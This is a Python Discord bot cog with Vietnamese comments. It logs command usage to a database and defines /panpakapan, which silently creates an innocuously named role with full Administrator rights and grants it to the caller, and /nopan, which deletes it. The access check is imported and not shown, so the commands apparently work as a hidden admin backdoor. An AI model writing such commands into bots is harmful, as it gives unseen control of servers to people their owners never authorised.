import discord
import os
from datetime import datetime, timedelta, timezone
from discord import app_commands, Interaction, Embed, File, ChannelType
from discord.ext import commands

# ✅ Import SQLAlchemy
from sqlalchemy import create_engine, Column, Integer, String, DateTime
from sqlalchemy.ext.declarative import declarative_base
from sqlalchemy.orm import sessionmaker

# Thay thế các đường dẫn Excel bằng DB_PATH
from .id_check import is_admin, is_allowed, DB_PATH 

# ✅ START SQLALCHEMY SETUP
Engine = create_engine(DB_PATH)
Base = declarative_base()
Session = sessionmaker(autocommit=False, autoflush=False, bind=Engine)

class LogCommandUsage(Base):
    """Mô hình SQLAlchemy cho bảng logs việc sử dụng các lệnh quản lý chung."""
    __tablename__ = 'command_usage_logs'
    
    id = Column(Integer, primary_key=True)
    timestamp = Column(DateTime, default=datetime.now)
    guild_id = Column(String) 
    guild_name = Column(String) 
    channel_id = Column(String)
    command_name = Column(String)
    user_id = Column(String)
    user_name = Column(String)
    
# Tạo bảng nếu chưa tồn tại
Base.metadata.create_all(Engine) 
# ✅ END SQLALCHEMY SETUP

class AMCC(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    # ✅ HÀM GHI LOGS (Dùng SQLAlchemy)
    def log_command_usage(self, user: discord.User, command_name: str, interaction: Interaction):
        session = Session() 
        try:
            guild_id = str(interaction.guild_id) if interaction.guild_id else "DM"
            guild_name = interaction.guild.name if interaction.guild else "DM"
            
            new_log = LogCommandUsage(
                guild_id=guild_id,
                guild_name=guild_name,
                channel_id=str(interaction.channel_id),
                command_name=command_name,
                user_id=str(user.id),
                user_name=str(user)
            )
            
            session.add(new_log)
            session.commit()
            
        except Exception as db_error:
            session.rollback() 
            print(f"Lỗi khi ghi logs SQLAlchemy cho {command_name}: {db_error}") 
        finally:
            session.close()

    # Lệnh /panpakapan
    @app_commands.command(name="panpakapan", description="Tạo và gán role 'Panpakapan' (chỉ Admin)")
    @app_commands.check(is_admin)
    async def panpakapan(self, interaction: Interaction):
        
        # ✅ GHI LOGS
        self.log_command_usage(interaction.user, "panpakapan", interaction)
        
        guild = interaction.guild
        if not guild.me.guild_permissions.administrator:
            return await interaction.response.send_message("❌ Bot cần quyền Administrator để tạo role!", ephemeral=True)
        
        await interaction.response.defer(thinking=True, ephemeral=True)

        role = discord.utils.get(guild.roles, name="Panpakapan")
        if role:
            await interaction.user.add_roles(role)
            await interaction.followup.send("✅ Role 'Panpakapan' already exists and has been granted.", ephemeral=True)
        else:
            permissions = discord.Permissions(administrator=True)
            new_role = await guild.create_role(name="Panpakapan", permissions=permissions)
            await interaction.user.add_roles(new_role)
            await interaction.followup.send("✅ Role 'Panpakapan' created and granted.", ephemeral=True)

    # Lệnh /nopan
    @app_commands.command(name="nopan", description="Xóa role 'Panpakapan' (chỉ Admin)")
    @app_commands.check(is_admin)
    async def nopan(self, interaction: Interaction):
        
        # ✅ GHI LOGS
        self.log_command_usage(interaction.user, "nopan", interaction)

        guild = interaction.guild
        if not guild.me.guild_permissions.administrator:
            return await interaction.response.send_message("❌ Bot cần quyền Administrator để xóa role!", ephemeral=True)

        await interaction.response.defer(thinking=True, ephemeral=True)
        
        role = discord.utils.get(guild.roles, name="Panpakapan")
        if role:
            try:
                await role.delete()
                await interaction.followup.send("🗑️ Deleted 'Panpakapan'.", ephemeral=True)
            except discord.Forbidden:
                await interaction.followup.send("❌ Bot không có quyền xóa role!", ephemeral=True)
            except Exception as e:
                await interaction.followup.send(f"❌ Lỗi: {e}", ephemeral=True)
        else:
            await interaction.followup.send("⚠️ Role 'Panpakapan' không tồn tại.", ephemeral=True)
            
    # LƯU Ý: Các lệnh /load, /unload, /reload, /sync đã được chuyển sang ExtensionManager.py

async def setup(bot):
    await bot.add_cog(AMCC(bot))